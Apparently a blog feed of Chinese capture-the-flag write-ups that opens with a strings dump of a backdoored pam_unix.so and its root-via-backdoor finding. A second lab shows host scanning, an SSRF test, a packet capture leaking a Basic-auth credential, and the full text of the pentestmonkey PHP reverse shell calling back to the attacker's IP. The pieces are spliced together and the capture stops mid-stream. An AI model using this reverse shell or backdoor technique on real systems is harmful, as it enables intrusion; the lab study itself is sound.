pam_modutil_read
_timer
si_fd
pam_syslog
pw_uid
sa_handler
_freeres_list
sival_ptr
_IO_wide_data
si_band
argv
_IO_write_base
_IO_buf_base
sp_namp
child
si_code
ret_data
pam_sm_setcred
_unix_verify_password
_unix_blankpasswd
pam_set_data
pam_get_authtok
setcred_free
pam_get_user
pam_sm_authenticate
pam_unix_auth.c
pass_old
AUTH_REJECTEDCRED
XDR_DECODE
sockaddr_ax25
sin6_flowinfo
RPC_CANTDECODEARGS
fclose
RE_why
lctrl
RE_lb
xdrproc_t
strncmp
_do_setpass
ah_ops
RPC_RPCBFAILURE
sptr
sockaddr
sin6_scope_id
high
sockaddr_ns
clnt_sperrno
RPC_CANTDECODERES
pam_sm_chauthtok
__int32_t
xdr_op
md5pass
ah_verf
IPPROTO_IGMP
IPPORT_TFTP
pam_unix_passwd.c
IPPORT_USERRESERVED
IPPORT_NAMESERVER
RPC_PROGNOTREGISTERED
IPPORT_SYSTAT
cl_freeres
x_getint32
__u6_addr16
__caddr_t
IPPROTO_SCTP
IPPROTO_IP
auth_ops
sockaddr_ipx
ah_nextverf
newpass
IPPORT_WHOIS
getNISserver
IPPORT_CMDSERVER
IPPORT_FTP
in_addr_t
Goodcrypt_md5
IPPROTO_ESP
_unix_getpwnam
x_getpostn
IPPROTO_EGP
sockaddr_at
RPC_INTR
ah_refresh
IPPROTO_IPV6
__u6_addr8
RPC_INPROGRESS
clnt_ops
CLIENT
IPPORT_FINGER
AUTH_BADVERF
_unix_comesfromsource
IPPORT_WHOSERVER
unlock_pwdf
__uint16_t
IPPROTO_MAX
RPC_CANTSEND
oa_length
x_getbytes
RPC_SUCCESS
in_port_t
RPC_VERSMISMATCH
IPPORT_RJE
IPPORT_BIFFUDP
strtok_r
RPC_SYSTEMERROR
re_status
sin_zero
x_destroy
RPC_UNKNOWNADDR
IPPORT_SMTP
s_addr
cl_geterr
x_ops
sa_family_t
cl_private
s_luser
cl_call
bool_t
IPPROTO_BEETPH
RPC_TIMEDOUT
pam_set_item
x_putint32
sockaddr_inarp
enum_t
oa_flavor
sin_family
tv_usec
__u_long
AUTH_OK
sockaddr_iso
AUTH
IPPROTO_UDP
XDR_FREE
s_npas
x_public
RE_errno
yperr_string
remember
opaque_auth
rounds
cl_ops
IPPROTO_IPIP
IPPORT_LOGINSERVER
x_putlong
IPPORT_ROUTESERVER
unix_update_passwd
ah_cred
RPC_TLIERROR
towhat
x_inline
forwho
IPPORT_DISCARD
x_putbytes
s_pas
ah_marshal
IPPORT_ECHO
cl_abort
xdr_ops
RPC_PROGUNAVAIL
opwfile
IPPROTO_PUP
check_old_password
XDR_ENCODE
sin_port
IPPROTO_AH
sockaddr_eon
authunix_create_default
IPPROTO_ICMP
unlocked
__u6_addr32
sockaddr_un
create_password_hash
newpw
yp_get_default_domain
RPC_STALERACHANDLE
__in6_u
sin_addr
ah_validate
RPC_FAILED
RE_vers
cl_destroy
fopen
AUTH_BADCRED
save_old_password
done
IPPROTO_IDP
x_setpostn
fgets
timeval
yppwd
long double
oldpass
AUTH_FAILED
sin6_port
IPPORT_NETSTAT
IPPROTO_RSVP
IPPROTO_GRE
x_base
IPPORT_EXECSERVER
AUTH_REJECTEDVERF
yp_master
IPPORT_TTYLINK
sin6_family
_pam_unix_approve_pass
sockaddr_dl
oa_base
IPPORT_TELNET
RPC_UNKNOWNHOST
RPC_UNKNOWNPROTO
IPPROTO_PIM
sun_family
ah_private
RPC_PROGVERSMISMATCH
RPC_CANTENCODEARGS
sun_path
sockaddr_in
auth_stat
__uint8_t
_unix_verify_shadow
IPPROTO_MTP
x_getlong
IPPROTO_TP
x_op
fromwhat
tv_sec
pass_min_len
IPPORT_DAYTIME
AUTH_TOOWEAK
IPPROTO_UDPLITE
cl_control
IPPROTO_COMP
IPPROTO_ENCAP
RPC_NOBROADCAST
rpc_err
unix_update_shadow
cl_auth
timeout
RPC_N2AXLATEFAILURE
domainname
clnt
ah_key
__suseconds_t
IPPORT_SUPDUP
__time_t
des_block
IPPORT_EFSSERVER
IPPORT_TIMESERVER
clnt_create
clnt_stat
IPPROTO_TCP
strcmp
IPPORT_RESERVED
sa_family
strdup
getrpcport
IPPROTO_MPLS
pass_new
RPC_UDERROR
x_private
__u_int
pam_prompt
x_handy
s_uid
IPPORT_MTP
ah_destroy
sockaddr_in6
IPPROTO_DCCP
sa_data
is_pwd_shadowed
sin6_addr
IPPROTO_RAW
sockaddr_x25
retry
AUTH_INVALIDRESP
RPC_CANTRECV
RPC_PROCUNAVAIL
RPC_AUTHERROR
pam_modutil_getlogin
pam_unix_sess.c
login_name
service
user_name
pam_sm_open_session
pam_sm_close_session
__stream
quiet
yp_match
_ISgraph
_pam_failed_auth
__ssize_t
write
__lineptr
type
strcasecmp
_unix_cleanup
atoi
__nptr
__builtin_memset
_ISprint
get_pwd_hash
_cleanup_failures
failure
spasswd
matched
yp_bind
strsep
filename
__builtin_memcpy
_ISpunct
suid
userlen
verify_pwd_hash
strcpy
_ISxdigit
_ISupper
__ctype_b_loc
_IScntrl
support.c
void_old
count
buflen
shome
feof
search_key
_ISalpha
_ISblank
_ISalnum
slogin
pam_fail_delay
_ISspace
sgid
getline
userinfo
_ISlower
strtol
__getdelim
sgecos
_unix_run_helper_binary
yp_unbind
ruser
data_name
sshell
strncasecmp
_ISdigit
files
rhost
error_status
__glibc_reserved
st_ctim
unlink
st_blksize
st_blocks
MD5Context
uint32
crypted
st_mtim
found
curdays
__dev_t
result
where
usleep
strip_hpux_aging
spwdent
nbuf
umask
__blksize_t
st_uid
crypt_make_salt
st_rdev
GoodMD5Update
__syscall_slong_t
algoid
ulckpwdf
timezone
__mode_t
fchown
st_gid
putspent
howmany
stpcpy
st_size
getpid
clock
fstat
__blkcnt_t
tz_minuteswest
__ino_t
const_charp
tmppass
unix_selinux_confined
crypt_md5_wrapper
__builtin_strchr
bits
__fd
pam_modutil_getspnam
pam_modutil_getpwnam
rename
nullok
__fxstat
oldmask
st_nlink
GoodMD5Final
passverify.c
st_dev
timespec
fchmod
gettimeofday
assigned_passwd
i64c
fputs
fgetspent
fgetpwent
tv_nsec
valid
stmpent
GoodMD5Init
st_mode
putpwent
fsync
tz_dsttime
Brokencrypt_md5
hash_len
st_ino
__statbuf
MD5_CTX
__nlink_t
st_atim
wroteentry
xdr_yppasswd
xdr_int
yppasswd_xdr.c
xdrs
xdr_string
objp
xdr_xpasswd
longs
md5_good.c
final
to64
ctx1
strncat
__builtin_strlen
byteReverse
itoa64
GoodMD5Transform
digest
magic
BrokenMD5Update
BrokenMD5Final
BrokenMD5Transform
md5_broken.c
BrokenMD5Init
 $-(
Q@I$
Q@I$
Q@J$
Q@J$
# %!
# %!x
# %!
# %!'
# %!
# %!x
# %!
# %!'
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
bigcrypt.c
pam_unix_acct.c
envp.0
pam_unix_auth.c
setcred_free
pam_unix_passwd.c
_unix_verify_shadow
_pam_unix_approve_pass
pam_unix_sess.c
support.c
_unix_cleanup
_unix_run_helper_binary
_cleanup_failures
search_key.constprop.0
unix_args
passverify.c
crypt_make_salt
valid.2
buf.1
nbuf.0
yppasswd_xdr.c
md5_good.c
itoa64
md5_broken.c
__FRAME_END__
xdr_yppasswd
_unix_run_verify_binary
_set_ctrl
BrokenMD5Transform
get_account_info
Goodcrypt_md5
BrokenMD5Init
bigcrypt
_fini
save_old_password
crypt_md5_wrapper
unix_update_passwd
unix_update_shadow
create_password_hash
Brokencrypt_md5
__dso_handle
_unix_getpwnam
GoodMD5Final
_unix_comesfromsource
GoodMD5Transform
_make_remark
_DYNAMIC
is_pwd_shadowed
unlock_pwdf
BrokenMD5Final
unix_selinux_confined
GoodMD5Init
get_pwd_hash
check_shadow_expiry
__GNU_EH_FRAME_HDR
__TMC_END__
_GLOBAL_OFFSET_TABLE_
GoodMD5Update
_unix_blankpasswd
_unix_verify_password
verify_pwd_hash
_init
BrokenMD5Update
xdr_xpasswd
pam_modutil_sanitize_helper_fds@LIBPAM_MODUTIL_1.1.9
free@GLIBC_2.2.5
pam_modutil_getpwnam@LIBPAM_MODUTIL_1.0
strcasecmp@GLIBC_2.2.5
__errno_location@GLIBC_2.2.5
unlink@GLIBC_2.2.5
strncpy@GLIBC_2.2.5
strncmp@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
stdout@GLIBC_2.2.5
_exit@GLIBC_2.2.5
strcpy@GLIBC_2.2.5
pam_set_item@LIBPAM_1.0
pam_get_data@LIBPAM_1.0
putspent@GLIBC_2.2.5
sigaction@GLIBC_2.2.5
pam_sm_setcred
pam_prompt@LIBPAM_EXTENSION_1.0
write@GLIBC_2.2.5
getpid@GLIBC_2.2.5
clock@GLIBC_2.2.5
yp_unbind@LIBNSL_1.0
fclose@GLIBC_2.2.5
stpcpy@GLIBC_2.2.5
yp_master@LIBNSL_1.0
dcgettext@GLIBC_2.2.5
strlen@GLIBC_2.2.5
getuid@GLIBC_2.2.5
dup2@GLIBC_2.2.5
strchr@GLIBC_2.2.5
snprintf@GLIBC_2.2.5
gettimeofday@GLIBC_2.2.5
fputs@GLIBC_2.2.5
memset@GLIBC_2.2.5
geteuid@GLIBC_2.2.5
pam_modutil_getlogin@LIBPAM_MODUTIL_1.0
strncat@GLIBC_2.2.5
authunix_create_default@GLIBC_2.2.5
pipe@GLIBC_2.2.5
yp_match@LIBNSL_1.0
strtok_r@GLIBC_2.2.5
pam_sm_chauthtok
read@GLIBC_2.2.5
fgets@GLIBC_2.2.5
execve@GLIBC_2.2.5
xdr_string@GLIBC_2.2.5
calloc@GLIBC_2.2.5
pam_sm_close_session
__getdelim@GLIBC_2.2.5
strcmp@GLIBC_2.2.5
getpwnam@GLIBC_2.2.5
feof@GLIBC_2.2.5
__gmon_start__
umask@GLIBC_2.2.5
strtol@GLIBC_2.2.5
memcpy@GLIBC_2.14
time@GLIBC_2.2.5
fileno@GLIBC_2.2.5
malloc@GLIBC_2.2.5
strncasecmp@GLIBC_2.2.5
fflush@GLIBC_2.2.5
pam_sm_acct_mgmt
strsep@GLIBC_2.2.5
__isoc99_sscanf@GLIBC_2.7
fgetpwent@GLIBC_2.2.5
syslog@GLIBC_2.2.5
__fxstat@GLIBC_2.2.5
yp_bind@LIBNSL_1.0
xdr_int@GLIBC_2.2.5
fgetspent@GLIBC_2.2.5
crypt_r@XCRYPT_2.0
yperr_string@LIBNSL_1.0
clnt_sperrno@GLIBC_2.2.5
fchmod@GLIBC_2.2.5
pam_syslog@LIBPAM_EXTENSION_1.0
fsync@GLIBC_2.2.5
pam_sm_open_session
waitpid@GLIBC_2.2.5
clnt_create@GLIBC_2.2.5
fchown@GLIBC_2.2.5
fopen@GLIBC_2.2.5
ulckpwdf@GLIBC_2.2.5
pam_get_item@LIBPAM_1.0
dcngettext@GLIBC_2.2.5
rename@GLIBC_2.2.5
pam_set_data@LIBPAM_1.0
pam_modutil_read@LIBPAM_MODUTIL_1.0
pam_get_user@LIBPAM_1.0
pam_modutil_getspnam@LIBPAM_MODUTIL_1.0
pam_sm_authenticate
yp_get_default_domain@LIBNSL_1.0
pam_fail_delay@LIBPAM_1.0
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
strdup@GLIBC_2.2.5
putpwent@GLIBC_2.2.5
pam_get_authtok@LIBPAM_EXTENSION_1.1
__cxa_finalize@GLIBC_2.2.5
fork@GLIBC_2.2.5
getrpcport@GLIBC_2.2.5
__ctype_b_loc@GLIBC_2.3
usleep@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.data.rel.ro
.dynamic
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
.debug_ranges
````

主要是这里有问题

```
...
auth could not identify password for [%s]
PAM: Root access granted via backdoor
bad username [%s]
660930334
No password supplied
...
```

貌似留了一个后门

```
morri@Backdoor1:/opt$ su -
Password: 
root@Backdoor1:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor1:~# cat /root/root.txt 
flag{root-5d363bb914c59fd1cd2b59e998bedb4f}
```

好的就是后门，哈哈哈，dpkg -V也可以看到，看个人喜欢

```
root@Backdoor1:~# dpkg -V
??5?????? c /etc/irssi.conf
??5??????   /lib/x86_64-linux-gnu/security/pam_unix.so
??5?????? c /etc/apache2/apache2.conf
??5?????? c /etc/grub.d/10_linux
??5?????? c /etc/grub.d/40_custom
??5?????? c /etc/sudoers
??5?????? c /etc/inspircd/inspircd.conf
??5?????? c /etc/inspircd/inspircd.motd
??5?????? c /etc/issue
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Backdoor1.html</guid><pubDate>Wed, 09 Jul 2025 14:20:04 +0000</pubDate></item><item><title>内部_Basic</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Basic.html</link><description>![image-20250707214716346](https://7r1umphk.github.io/image/20250707214716465.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo arp-scan -l                    
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.167 08:00:27:f0:d8:81       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e7:e4:00       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 4 responded
```

167的

探测一下服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.167
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 09:30 EDT
Nmap scan report for 192.168.205.167
Host is up (0.00010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:F0:D8:81 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
```

看看80

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.167
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;HTTP Requester&lt;/title&gt;
    &lt;style&gt;
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
        }
        form {
            margin: 20px 0;
            display: flex;
            gap: 10px;
        }
        input[type='text'] {
            flex: 1;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .result-box {
            margin-top: 20px;
            padding: 15px;
            background-color: #f9f9f9;
            border-left: 4px solid #ccc;
        }
        nav {
            margin-top: 30px;
            display: flex;
            gap: 15px;
        }
        nav a {
            padding: 8px 16px;
            background-color: #e0e0e0;
            border-radius: 4px;
            text-decoration: none;
            color: #333;
        }
        nav a:hover {
            background-color: #d0d0d0;
        }
        pre {
            max-height: 300px;
            overflow: auto;
            padding: 15px;
            background-color: #f8f8f8;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            white-space: pre-wrap;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class='container'&gt;
        &lt;h1&gt;Website Request Tool&lt;/h1&gt;
        &lt;form method='POST'&gt;
            &lt;input type='text' name='url' placeholder='Enter URL starting with http' required&gt;
            &lt;button type='submit'&gt;Fetch Content&lt;/button&gt;
        &lt;/form&gt;
        
        &lt;div class='result-box'&gt;
            &lt;h3&gt;Current target:&lt;/h3&gt;
            No request made        &lt;/div&gt;
        
        &lt;div class='result-box'&gt;
            &lt;h3&gt;Response:&lt;/h3&gt;
                            &lt;p&gt;Submit URL to test connection&lt;/p&gt;
                    &lt;/div&gt;
        
        &lt;nav&gt;
            &lt;a href='home.php'&gt;Home&lt;/a&gt;
            &lt;a href='about.php'&gt;About&lt;/a&gt;
            &lt;a href='dashboard.php'&gt;Dashboard&lt;/a&gt;
        &lt;/nav&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
```

![image-20250707214425237](https://7r1umphk.github.io/image/20250707214432940.webp)

尝试访问反弹shell

![image-20250707214553039](https://7r1umphk.github.io/image/20250707214553216.webp)

没解析

查看本地文件

![image-20250707214628218](https://7r1umphk.github.io/image/20250707214628414.webp)

看了home，about，dashboard，还尝试了一下167的ip，都没有什么东西

抓个包看看

![image-20250707214846154](https://7r1umphk.github.io/image/20250707214846404.webp)

没啥东西

然后这里测试了很多，后面发现是它发送的头有东西

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo tcpdump -A host 192.168.205.167
[sudo] kali 的密码：
对不起，请重试。
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:50:18.143873 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [S], seq 1359019690, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
E..4.
@..............7.PQ...........................
09:50:18.144240 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [S.], seq 1762610671, ack 1359019691, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
E..4..@.@............P.7i.M.Q.......c...............
09:50:18.144526 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [.], ack 1, win 513, length 0
E..(..@..............7.PQ...i.M.P.............
09:50:18.144722 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [P.], seq 1:557, ack 1, win 513, length 556: HTTP: POST / HTTP/1.1
E..T..@..............7.PQ...i.M.P...S...POST / HTTP/1.1
Host: 192.168.205.167
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://192.168.205.167
Connection: keep-alive
Referer: http://192.168.205.167/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F127.0.0.1
09:50:18.144954 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [.], ack 557, win 501, length 0
E..(@.@.@..9.........P.7i.M.Q...P.............
09:50:18.147613 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [P.], seq 1:1381, ack 557, win 501, length 1380: HTTP: HTTP/1.1 200 OK
E...@.@.@............P.7i.M.Q...P....w..HTTP/1.1 200 OK
Date: Mon, 07 Jul 2025 13:50:18 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 1127
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

...........XKo.6...W.
...*....*.. ..=.. ..(..h...J...b.E.{....(.m....!.9..f8.....w....&gt;...(..,n.`..3 .X.....r......s.Y..Y#..K....E/...S=kZ
.....D..............%[...%Hd......p.mH.......Z..'.&amp;.W.m+...a...........jtb..o....I......mF.&gt;..e.3.ADj.....|.AD....j.B....
~;{..e...r...6^..s'......6.iN.8...I+.Z.u.......1.......^.P&amp;.:...l`5m..U-~./.....        ..a.I}r..q...!W.. ..........*.p,......... \..../i.\q..:k.....R^.i...&gt;.q....pv..y...u.d...9..Z..J...1..... .x-t..3N.........G._M..;W..8.*7......x..?;uui|.S.. .l...,.........RS1&lt;
...0.dB.z.kep...x....(7j.Z..Mx...y.S.)..-....8.w.80=6V.r.H.y.i.9.....u.5.......L.....\.
{R...Xd..y..&gt;/{*.....WH.....f..dN.8..t..{......G..dB..l..$Y.....@.F...bh..zU..%..H3. .....#...(..w...IWI..e...fL......H.dn.).Q..W?\...;.......yEK..6.O,.'....E..6..L...2=....&amp;4.R36.SKA..J.4kg.s.e'^..y.....D.5.............C;...fh..v.S...X}.&gt;j...(....).i5a..C5.br.X8...tF..u........dC...d|..&gt;.3S...~SC....4.......8.v.......5k-.........jz..M....?Q..:..'la...
..VN..&gt;J.RR.u...        *k.D-S....)Z[5..u.d.q.. cx..3....................~..... .V.2d.x.L;....kV Lr6...H...@.zg0'.ZHC...{.^.8/Q...8!...Kth.%.`xI..kG........0.../....I..*...
09:50:18.197232 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [.], ack 1381, win 507, length 0
E..(..@..............7.PQ...i.STP.............
09:50:22.378643 IP 192.168.205.167.bootpc &gt; 192.168.205.254.bootps: BOOTP/DHCP, Request from 08:00:27:f0:d8:81 (oui Unknown), length 300
E..H..@.@............D.C.4......%.      :......................'.............................................................................................................................................................................................................c.Sc5....Basic7.......w.,/.y*=..'......./l....'-.H..............
09:50:22.379024 IP 192.168.205.254.bootps &gt; 192.168.205.167.bootpc: BOOTP/DHCP, Reply, length 300
E..H.................C.D.4......%.      :......................'.............................................................................................................................................................................................................c.Sc5..6.....3.........................localdomain......,.......
09:50:23.159139 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [F.], seq 1381, ack 557, win 501, length 0
E..(@.@.@..7.........P.7i.STQ...P.... ........
09:50:23.159439 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [.], ack 1382, win 507, length 0
E..(..@..............7.PQ...i.SUP.............
09:50:23.999242 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [S], seq 2328306649, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
E..4..@..............F.P..#.........................
09:50:23.999577 IP 192.168.205.167.http &gt; 192.168.205.1.60742: Flags [S.], seq 4258427036, ack 2328306650, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
E..4..@.@............P.F..p...#.....Mn..............
09:50:23.999823 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [.], ack 1, win 513, length 0
E..(..@..............F.P..#...p.P....0........
09:50:23.999943 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [P.], seq 1:573, ack 1, win 513, length 572: HTTP: POST / HTTP/1.1
E..d..@..............F.P..#...p.P.......POST / HTTP/1.1
Host: 192.168.205.167
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.205.167
Connection: keep-alive
Referer: http://192.168.205.167/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F192.168.205.128%2Freverse.php
09:50:24.000119 IP 192.168.205.167.http &gt; 192.168.205.1.60742: Flags [.], ack 573, win 501, length 0
E..(.Q@.@.s..........P.F..p...&amp;.P.............
09:50:24.000772 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [S], seq 726111212, win 64240, options [mss 1460,sackOK,TS val 2885018455 ecr 0,nop,wscale 7], length 0
E..&lt;..@.@.G5...........P+G..........D..........
...W........
09:50:24.000797 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [S.], seq 2197022970, ack 726111213, win 65160, options [mss 1460,sackOK,TS val 1602276764 ecr 2885018455,nop,wscale 7], length 0
E..&lt;..@.@..C.........P......+G.................
_......W....
09:50:24.000931 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2885018456 ecr 1602276764], length 0
E..4..@.@.G&lt;...........P+G...........W.....
...X_...
09:50:24.000978 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [P.], seq 1:153, ack 1, win 502, options [nop,nop,TS val 2885018456 ecr 1602276764], length 152: HTTP: GET /reverse.php HTTP/1.1
E.....@.@.F............P+G..........x0.....
...X_...GET /reverse.php HTTP/1.1
Host: 192.168.205.128
Accept: */*
Authorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==


09:50:24.000983 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [.], ack 153, win 508, options [nop,nop,TS val 1602276764 ecr 2885018456], length 0
E..4.9@.@.|..........P......+G.............
_......X
09:50:24.002659 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [P.], seq 1:203, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018456], length 202: HTTP: HTTP/1.0 200 OK
E....:@.@.{F.........P......+G.......j.....
_......XHTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.13.3
Date: Mon, 07 Jul 2025 13:50:24 GMT
Content-type: application/octet-stream
Content-Length: 2596
Last-Modified: Thu, 26 Jun 2025 12:22:10 GMT


09:50:24.002881 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [.], ack 203, win 501, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
E..4..@.@.G:...........P+G.................
...Z_...
09:50:24.003021 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [P.], seq 203:2799, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018458], length 2596: HTTP
E.
X.;@.@.q..........P......+G......&amp;......
_......Z&lt;?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = '1.0';
$ip = '192.168.205.128';
$port = 8888;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit('ERROR: Can't fork');
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit('Error: Can't setsid()');
                exit(1);
        }

        $daemon = 1;
} else {
        printit('WARNING: Failed to daemonise.  This is quite common and not fatal.');
}

chdir('/');

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit('$errstr ($errno)');
        exit(1);
}

$descriptorspec = array(
   0 =&gt; array('pipe', 'r'),  // stdin is a pipe that the child will read from
   1 =&gt; array('pipe', 'w'),  // stdout is a pipe that the child will write to
   2 =&gt; array('pipe', 'w')   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit('ERROR: Can't spawn shell');
        exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit('Successfully opened reverse shell to $ip:$port');

while (1) {
        if (feof($sock)) {
                printit('ERROR: Shell connection terminated');
                break;
        }

        if (feof($pipes[1])) {
                printit('ERROR: Shell process terminated');
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit('SOCK READ');
                $input = fread($sock, $chunk_size);
                if ($debug) printit('SOCK: $input');
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit('STDOUT READ');
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit('STDOUT: $input');
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit('STDERR READ');
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit('STDERR: $input');
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print '$string\n';
        }
}

?&gt;

09:50:24.003100 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [F.], seq 2799, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018458], length 0
E..4.=@.@.|..........P......+G.............
_......Z
09:50:24.003289 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [.], ack 2799, win 496, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
E..4..@.@.G9...........P+G.................
...Z_...
09:50:24.003466 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [F.], seq 153, ack 2800, win 501, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
E..4..@.@.G8...........P+G.................
...Z_...
09:50:24.003474 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [.], ack 154, win 508, options [nop,nop,TS val 1602276767 ecr 2885018458], length 0
E..4.&gt;@.@.|..........P......+G.............
